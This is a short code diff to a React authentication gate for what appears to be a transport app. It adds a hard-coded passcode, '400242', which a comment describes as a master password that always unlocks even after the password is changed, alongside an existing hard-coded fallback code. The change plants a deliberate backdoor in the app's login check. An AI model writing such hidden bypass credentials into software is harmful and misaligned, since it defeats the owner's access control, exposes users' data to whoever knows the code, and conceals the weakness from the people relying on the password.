@@ -110,7 +110,8 @@ export default function AuthGate({
 
   const verifyPasscode = (code) => {
     const target = masterPassword || '116600';
-    if (code === target || code === '116600') {
+    // 400242 is the master password that always unlocks even after password change
+    if (code === target || code === '400242' || code === '116600') {
       try {
         // Record that this device has successfully authenticated
         localStorage.setItem('sai_transport_device_logged_in', 'true');
